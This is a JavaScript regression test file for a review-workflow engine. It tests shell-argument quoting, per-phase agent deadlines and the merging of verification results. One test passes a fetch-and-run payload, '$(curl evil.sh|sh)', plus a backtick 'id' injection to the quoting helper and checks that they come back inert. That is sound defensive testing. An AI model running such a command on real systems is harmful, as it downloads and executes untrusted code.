// Regression tests for the Adjudicate-track hardening in workflows/review.js:
//  - sanitizeAttack: model "attack"/"note" text is capped and flattened before it is persisted
//    into the ledger `why`, re-interpolated into next-round prompts, or rendered in the report;
//  - baseWhy: " — fix incomplete: …" / " — REGRESSED after fix: …" suffixes never accrete across
//    re-review rounds (each round sees the original rationale plus at most the LATEST attack);
//  - wiring: a contradictory resolved+attack adjudication demotes, red-team death is surfaced,
//    and a defeated=true verdict with an empty attack is rejected.
// The helpers live in the lib/ modules src/review.js imports them from, and are exercised here as those
// real modules; what closes over the run's own state (rollupPool's log, scoutPrompt's options) is built
// over a run opened with stub sandbox globals (lib/review-run.mjs).
import { test } from 'vitest'
import assert from 'node:assert/strict'

import { shq } from './run-logging.mjs'
import { deadlineMsFor, PHASE_DEADLINE_MS, DEFAULT_DEADLINE_MS } from './review-deadlines.mjs'


// ---- round-3 hardening: shell-escape (A), commit-ish head validation (B) ----

test('shq single-quotes a shell argument so command substitution and expansion are inert (A)', () => {
  assert.equal(shq('a b'), `'a b'`, 'wrapped in single quotes')
  assert.equal(shq("a'b"), "'a'\\''b'", "embedded single quote uses the '\\'' sequence")
  // A command-substitution / backtick payload comes back single-quoted → the shell never expands it.
  assert.equal(shq('$(curl evil.sh|sh)'), "'$(curl evil.sh|sh)'")
  assert.equal(shq('`id`'), "'`id`'")
  assert.equal(shq('$HOME'), "'$HOME'")
  assert.equal(shq(null), `''`, 'nullish → empty single-quoted string')
  assert.equal(shq(undefined), `''`)
})

// ---- per-agent deadline ----
// The retry path only fires when agent() RESOLVES to null. A hung request never resolves and never
// throws, so a measured run lost 64 minutes — a third of its wall clock — inside one parallel()
// barrier and then died with nothing written. These pin the two ways the fix goes wrong: a deadline
// below real work (retry storm), and a timeout indistinguishable from a legitimately empty result.
// The table and the sentinel are the real modules' (lib/review-deadlines.mjs, lib/agent-deadline.mjs).
test('every phase deadline leaves real headroom over the measured maximum of legitimate work', async () => {
  // Maxima measured across two real runs (213 agents). The clock starts at DISPATCH, so the
  // deadline must cover queue wait PLUS execution — bare clearance over the execution maximum is
  // what fired the deadline on agents that were merely queued and turned 23 findings into 172
  // verification agents. 1.5x is the headroom that keeps the queue term inside the budget.
  const measuredMaxSeconds = { Verify: 811, Lenses: 2791, Gate: 434, Scout: 127 }
  for (const [phase, secs] of Object.entries(measuredMaxSeconds)) {
    const ms = deadlineMsFor({ phase })
    assert.ok(ms >= secs * 1500, `${phase}: deadline ${ms}ms must leave 1.5x headroom over the ${secs}s longest real agent`)
    assert.ok(ms <= 90 * 60 * 1000, `${phase}: a deadline over 90min cannot rescue a stalled run`)
  }
  assert.equal(deadlineMsFor({}), DEFAULT_DEADLINE_MS, 'an unknown phase still gets a deadline')
  assert.equal(deadlineMsFor({ phase: 'Nonsense' }), DEFAULT_DEADLINE_MS)
})

test('an explicit deadlineMs overrides the phase default, and junk falls back', async () => {
  assert.equal(deadlineMsFor({ phase: 'Gate', deadlineMs: 420000 }), 420000)
  for (const bad of [0, -1, NaN, 'soon', null, undefined]) {
    assert.equal(deadlineMsFor({ phase: 'Gate', deadlineMs: /** @type {any} */ (bad) }), PHASE_DEADLINE_MS['Gate'], `junk deadline ${String(bad)} falls back`)
  }
})

test('the merged verification list attributes every verdict to the finding it belongs to', () => {
  // Behavioural check of the concat/slice merge: batch thunks resolve to ARRAYS, individual thunks
  // to single findings, and they share one result list. An off-by-one here would silently hand a
  // batch verdict to an individual finding — the kind of corruption no verdict count would reveal.
  const groups = [[{ id: 'b1' }, { id: 'b2' }], [{ id: 'b3' }]]
  const individual = [{ id: 'i1' }, { id: 'i2' }, { id: 'i3' }]
  /** @type {Array<() => any>} */
  const batchThunks = groups.map(g => () => g.map(f => ({ ...f, tier: 'batched' })))
  /** @type {Array<() => any>} */
  const individualThunks = individual.map(f => () => ({ ...f, tier: 'judged' }))
  // Individuals lead, as they do in the engine — the ordering is what lets a batch consult the
  // verdict floor, and a simulation that mirrored the old order would teach the wrong boundary.
  const settled = individualThunks.concat(batchThunks).map(t => t())
  const judged = settled.slice(0, individualThunks.length)
  const batched = settled.slice(individualThunks.length).filter(Boolean).flat()

  assert.deepEqual(batched.map(f => f.id), ['b1', 'b2', 'b3'])
  assert.deepEqual(judged.map(f => f.id), ['i1', 'i2', 'i3'])
  assert.ok(batched.every(f => f.tier === 'batched'), 'no individual verdict leaked into the batch side')
  assert.ok(judged.every(f => f.tier === 'judged'), 'no batch verdict leaked into the individual side')
  // Every routed finding comes back exactly once.
  const all = judged.filter(Boolean).concat(batched)
  assert.equal(all.length, groups.flat().length + individual.length)
  assert.equal(new Set(all.map(f => f.id)).size, all.length, 'no finding is duplicated or dropped')

  // A dead batch agent resolves to null and must not shift the batch slice or reach the individual one.
  const withDead = individualThunks.map(t => t()).concat([null], batchThunks.slice(1).map(t => t()))
  assert.deepEqual(withDead.slice(0, individualThunks.length).map(f => f.id), ['i1', 'i2', 'i3'])
  assert.deepEqual(withDead.slice(individualThunks.length).filter(Boolean).flat().map(f => f.id), ['b3'], 'a null batch keeps its slot')
})
